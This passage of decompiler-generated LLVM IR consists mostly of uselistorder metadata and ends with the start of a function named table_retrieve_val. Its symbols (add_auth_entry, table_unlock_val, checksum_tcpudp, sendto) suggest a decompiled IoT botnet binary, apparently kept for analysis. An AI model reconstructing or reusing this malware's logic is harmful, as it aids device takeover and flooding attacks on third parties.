  uselistorder i32 %v0_f1a0, { 1, 0 }
  uselistorder i32 %v1_f198, { 1, 0 }
  uselistorder i32 %v1_f190, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f18c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f18c, { 0, 2, 1 }
  uselistorder i32 %v0_f16c.pr, { 1, 0 }
  uselistorder i32 %v0_f14c.pr, { 1, 0 }
  uselistorder i1 %v7_f124, { 1, 0 }
  uselistorder i1 %v2_f114, { 1, 0, 2 }
  uselistorder i1 %v2_f0f8, { 1, 0, 2 }
  uselistorder i32 %v1_f118, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f0ec, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f11c, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f080, { 1, 0 }
  uselistorder i8 %v3_f078, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f070, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f070, { 0, 2, 1 }
  uselistorder i32 %v0_f068, { 1, 0 }
  uselistorder i1 %v7_f064, { 1, 0 }
  uselistorder i1 %v7_f05c, { 1, 0 }
  uselistorder i1 %v7_f054, { 1, 0 }
  uselistorder i1 %v7_f040, { 1, 0 }
  uselistorder i1 %v7_f038, { 1, 0 }
  uselistorder i1 %v7_f030, { 1, 0 }
  uselistorder i1 %v8_f028, { 1, 0 }
  uselistorder i32 %v1_f010, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_efac, { 1, 0 }
  uselistorder i8 %v3_efa4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ef9c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_ef9c, { 0, 2, 1 }
  uselistorder i32 %v0_ef94, { 1, 0 }
  uselistorder i1 %v7_ef90, { 1, 0 }
  uselistorder i1 %v7_ef88, { 1, 0 }
  uselistorder i1 %v7_ef80, { 1, 0 }
  uselistorder i1 %v7_ef6c, { 1, 0 }
  uselistorder i1 %v7_ef64, { 1, 0 }
  uselistorder i1 %v7_ef5c, { 1, 0 }
  uselistorder i1 %v8_ef54, { 1, 0 }
  uselistorder i32 %v1_ef3c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_ef28, { 1, 2, 0 }
  uselistorder i32 %v2_ef14, { 1, 0 }
  uselistorder i32 %v0_ef14, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_ef10, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_eee8, { 2, 1, 0 }
  uselistorder i1 %v7_eec4, { 1, 0 }
  uselistorder i32 %v4_eec0, { 1, 0, 2 }
  uselistorder i32 %v1_ee80, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_ee64, { 1, 0 }
  uselistorder i32 %v1_ee54, { 2, 1, 0 }
  uselistorder i32 %v1_ee50, { 1, 0 }
  uselistorder i32 %v0_edf4, { 2, 5, 6, 20, 7, 8, 21, 9, 10, 24, 11, 12, 22, 13, 14, 23, 4, 3, 19, 15, 16, 25, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_edd0, { 1, 2, 3, 0 }
  uselistorder i32 %v3_edcc, { 1, 0 }
  uselistorder i32 %v4_edb0, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_ed9c, { 1, 0, 2 }
  uselistorder i32 %v3_ed98, { 1, 0, 2 }
  uselistorder i32 %v0_f854, { 1, 0, 2 }
  uselistorder i32 %v3_ed64, { 1, 0 }
  uselistorder i32 %v1_ed4c, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ed48, { 1, 0 }
  uselistorder i32 %v3_ed40, { 1, 2, 0 }
  uselistorder i1 %v7_ed30, { 1, 0 }
  uselistorder i32 %v3_ed2c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_ed20, { 1, 0 }
  uselistorder i32 %v1_ecc8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ecc8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ecac, { 0, 2, 1 }
  uselistorder i32 %v1_eca4, { 1, 0 }
  uselistorder i32 %v1_ec64, { 2, 1, 0 }
  uselistorder i32 %v1_ec60, { 1, 0 }
  uselistorder i1 %v2_ec40, { 1, 0, 2 }
  uselistorder i32 %v0_ec3c, { 1, 0, 2 }
  uselistorder i1 %v7_ec08, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_ec08, { 1, 0, 2 }
  uselistorder i32 %v2_ec00, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_ebf4, { 1, 0, 2 }
  uselistorder i32 %v0_ebf8, { 1, 0 }
  uselistorder i32 %v1_ebdc, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_ebd0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ebd0, { 0, 2, 1 }
  uselistorder i32 %v1_ebc0, { 1, 0 }
  uselistorder i32 %v3_ec8c, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_eb20, { 1, 0 }
  uselistorder i32 %v1_eb08, { 0, 2, 3, 1 }
  uselistorder i32 %v0_eb14, { 0, 3, 2, 1 }
  uselistorder i32 %v0_eac4, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_eab8, { 2, 1, 0 }
  uselistorder i32 %v1_ea98, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_ea74, { 1, 0 }
  uselistorder i1 %v9_ea40, { 1, 0 }
  uselistorder i32 %v0_e9f0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e994, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_e944, { 1, 0 }
  uselistorder i32 %v5_e8dc, { 1, 0 }
  uselistorder i32 %v3_e8cc, { 1, 2, 0 }
  uselistorder i16 %v4_e8c8, { 1, 0 }
  uselistorder i32 %v3_e8c8, { 1, 0 }
  uselistorder i1 %v2_e804, { 1, 0 }
  uselistorder i1 %v2_e7f0, { 1, 0 }
  uselistorder i1 %v2_e7dc, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_e7b8, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_e7a0, { 1, 0 }
  uselistorder i1 %v3_e784, { 1, 0, 2 }
  uselistorder i1 %v2_e770, { 1, 0 }
  uselistorder i1 %v2_e74c, { 1, 0 }
  uselistorder i32 %v1_e6fc, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e6e8, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e6e4, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_e6cc, { 1, 0 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e6b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f7e4, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f628, { 0, 2, 1, 4, 11, 12, 10, 7, 9, 8, 6, 5, 3 }
  uselistorder i32 %v2_f6d0, { 1, 2, 0 }
  uselistorder i32 %v2_ec98, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_e68c, { 0, 2, 4, 7, 6, 8, 1, 3, 5, 9, 10 }
  uselistorder i32 %v4_e55c, { 2, 1, 0, 3 }
  uselistorder i16 %v5_e4f0.le, { 1, 0 }
  uselistorder i32 %v0_e4d4, { 3, 2, 0, 1 }
  uselistorder i32 %v2_e4a8, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v7_e474, { 1, 0 }
  uselistorder i32 %v3_e46c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_e458, { 1, 0 }
  uselistorder i32 %v2_e43c, { 1, 0, 2 }
  uselistorder i32 %v0_e428, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_e39c, { 3, 2, 1, 0, 4 }
  uselistorder i8* %stack_var_-56, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 0, 11, 12, 13, 9, 14, 15, 1, 2, 16, 3, 17, 6, 18, 4, 19, 5, 20, 7, 21, 8, 22, 10, 23 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 120, 119, 121, 122, 124, 123, 125, 126, 35, 86, 62, 63, 0, 1, 2, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 64, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 152, 154, 153, 150, 155, 164, 165, 156, 157, 163, 158, 159, 160, 161, 162, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 105, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 89, 88, 91, 90, 99, 92, 93, 94, 95, 96, 97, 98, 100, 101, 102, 103, 104 }
  uselistorder i32* %r2.global-to-local, { 76, 77, 78, 79, 80, 81, 82, 35, 36, 37, 83, 84, 85, 86, 23, 38, 39, 0, 1, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 40, 41, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 100, 74, 75, 102, 103, 105, 104, 101, 115, 106, 116, 107, 113, 114, 108, 109, 110, 111, 112, 42, 43, 44, 45, 99, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32* %r1.global-to-local, { 83, 84, 85, 86, 87, 88, 89, 42, 44, 43, 45, 90, 91, 92, 29, 46, 47, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 103, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 81, 82, 48, 49, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder i32* %r0.global-to-local, { 155, 154, 156, 157, 158, 160, 159, 161, 162, 163, 164, 166, 167, 165, 82, 81, 83, 85, 84, 86, 87, 88, 90, 89, 23, 25, 171, 168, 1, 3, 2, 4, 169, 170, 0, 172, 91, 174, 59, 61, 60, 93, 92, 94, 96, 95, 97, 99, 98, 100, 26, 6, 5, 8, 7, 10, 9, 11, 62, 13, 12, 14, 16, 15, 18, 17, 19, 20, 21, 22, 28, 27, 30, 29, 196, 24, 32, 31, 33, 34, 35, 37, 36, 39, 38, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 64, 63, 65, 67, 66, 69, 68, 71, 70, 72, 73, 75, 74, 77, 76, 79, 78, 80, 102, 104, 103, 105, 101, 106, 107, 187, 173, 177, 175, 176, 182, 178, 179, 108, 180, 181, 183, 185, 184, 186, 188, 193, 189, 192, 190, 191, 195, 194, 109, 112, 110, 111, 114, 113, 153, 152, 116, 115, 117, 119, 118, 121, 120, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 141, 140, 142, 147, 143, 144, 145, 146, 148, 149, 150, 151 }
  uselistorder i32* %ip.global-to-local, { 15, 16, 17, 0, 18, 21, 19, 20, 22, 23, 1, 2, 3, 4, 5, 6, 7, 14, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cpsr_z.global-to-local, { 109, 110, 219, 124, 195, 1, 111, 112, 203, 204, 113, 202, 115, 118, 119, 66, 67, 68, 69, 70, 0, 114, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 117, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 32, 33, 34, 29, 30, 31, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 125, 88, 89, 90, 85, 86, 87, 91, 92, 93, 94, 95, 96, 100, 101, 102, 97, 98, 99, 103, 104, 105, 106, 107, 108, 120, 121, 122, 123, 208, 210, 209, 211, 212, 213, 214, 215, 216, 217, 218, 126, 127, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 232, 234, 235, 233, 230, 231, 65, 207, 205, 236, 206, 237, 238, 239, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 200, 163, 164, 199, 165, 166, 198, 167, 168, 169, 170, 171, 172, 197, 173, 174, 175, 176, 177, 196, 178, 179, 180, 201, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 116, 194 }
  uselistorder i1* %cpsr_c.global-to-local, { 109, 110, 213, 120, 189, 2, 197, 67, 68, 198, 111, 196, 113, 115, 116, 69, 70, 71, 72, 1, 0, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 114, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 33, 34, 35, 30, 31, 32, 36, 37, 38, 39, 40, 41, 45, 46, 47, 42, 43, 44, 48, 49, 50, 51, 52, 53, 57, 58, 59, 54, 55, 56, 60, 61, 62, 63, 64, 65, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 121, 88, 89, 90, 85, 86, 87, 91, 92, 93, 94, 95, 96, 100, 101, 102, 97, 98, 99, 103, 104, 105, 106, 107, 108, 117, 118, 119, 202, 204, 203, 205, 206, 207, 208, 209, 210, 211, 212, 122, 123, 214, 215, 216, 217, 218, 219, 220, 221, 224, 226, 227, 225, 222, 223, 66, 201, 199, 228, 200, 229, 230, 231, 232, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 193, 156, 157, 192, 158, 159, 191, 160, 161, 162, 163, 164, 165, 190, 166, 167, 168, 169, 170, 195, 171, 172, 173, 194, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 112, 188 }
  uselistorder i32 (i32)* @inet_addr, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_18f4c.90 to i32), { 0, 2, 1, 3 }
  uselistorder i16** @global_var_21908.143, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_21908.143 to i16*), { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_18ff0.203 to i32), { 5, 7, 6, 8, 2, 9, 0, 10, 1, 11, 3, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 10, 9, 8, 7, 6, 5, 4, 20, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 11 }
  uselistorder i8 34, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 62, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @table_lock_val, { 26, 39, 38, 25, 32, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 24, 0, 22, 21, 20, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 36, 12, 13, 14, 11, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32)* @table_unlock_val, { 22, 21, 30, 29, 28, 27, 26, 25, 24, 23, 20, 0, 18, 17, 16, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_218f4.198, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_218e6.195 to i16*), { 1, 0, 2 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 10, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18fd0.189 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_18fc8.187 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_18f6c.165 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_218fd.162, { 1, 0 }
  uselistorder i16* @global_var_218f2.161, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 1, 0, 2 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_218f0.156, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_218f0.156 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_218fc.157, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_218dc.153, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_218dc.153 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 20, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 4, 3, 2, 1, 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 8, 7, 6, 5, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_243f4.151, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_243f0.149, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_2190c.137, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_243d4.57, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_243d4.57 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fa3c, { 1, 0 }
  uselistorder label %dec_label_pc_fa34, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_fa28, { 1, 0 }
  uselistorder label %dec_label_pc_ed78.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ed78.backedge.thread561, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ed78.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f818, { 1, 0 }
  uselistorder label %dec_label_pc_f778, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f740, { 1, 0 }
  uselistorder label %dec_label_pc_f72c, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f71c, { 1, 0 }
  uselistorder label %dec_label_pc_f60c, { 1, 0 }
  uselistorder label %dec_label_pc_f58c, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f558, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f508, { 1, 0 }
  uselistorder label %dec_label_pc_f44c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f434, { 1, 0 }
  uselistorder label %dec_label_pc_f300, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f2e8, { 1, 0 }
  uselistorder label %dec_label_pc_f22c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f214, { 1, 0 }
  uselistorder label %dec_label_pc_f1a0, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f16c, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f14c, { 1, 0 }
  uselistorder label %dec_label_pc_f138, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f0f4, { 1, 0 }
  uselistorder label %dec_label_pc_f0f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f088, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f070, { 1, 0 }
  uselistorder label %dec_label_pc_efb4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ef9c, { 1, 0 }
  uselistorder label %dec_label_pc_ee7c, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_ee44, { 1, 0 }
  uselistorder label %dec_label_pc_eddc, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ed90, { 1, 0 }
  uselistorder label %dec_label_pc_ed80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ed80.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ed5c, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_ec80, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_eb74.dec_label_pc_eb74_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_eb50.dec_label_pc_eb50_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_eb44, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_eb2c, { 1, 0 }
  uselistorder label %dec_label_pc_eb08, { 1, 0 }
  uselistorder label %dec_label_pc_e9bc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_e9a8, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_e83c, { 1, 0 }
  uselistorder label %dec_label_pc_e830, { 1, 0 }
  uselistorder label %dec_label_pc_e824, { 1, 0 }
  uselistorder label %dec_label_pc_e818, { 1, 0 }
  uselistorder label %dec_label_pc_e80c, { 1, 0 }
  uselistorder label %dec_label_pc_e7f8, { 1, 0 }
  uselistorder label %dec_label_pc_e7e4, { 1, 0 }
  uselistorder label %dec_label_pc_e7d0, { 1, 0 }
  uselistorder label %dec_label_pc_e7b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e78c, { 1, 0 }
  uselistorder label %dec_label_pc_e780, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e75c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e738, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e6e4, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_e4d4, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24400.213 to i32), i32* @r2, align 4
  %v3_fae4 = mul i32 %arg1, 8
  %v2_fae8 = add i32 %v3_fae4, ptrtoint (i32* @global_var_24400.213 to i32)
  store i32 %v2_fae8, i32* @r3, align 4
  %v2_faec = icmp eq i32* %arg2, null
  br i1 %v2_faec, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_faf44 = inttoptr i32 %v2_fae8 to i32*
  %v4_faf45 = load i32, i32* %v3_faf44, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_faf0 = add i32 %v3_fae4, add (i32 ptrtoint (i32* @global_var_24400.213 to i32), i32 4)
  %v3_faf0 = inttoptr i32 %v2_faf0 to i16*
  %v4_faf0 = load i16, i16* %v3_faf0, align 4
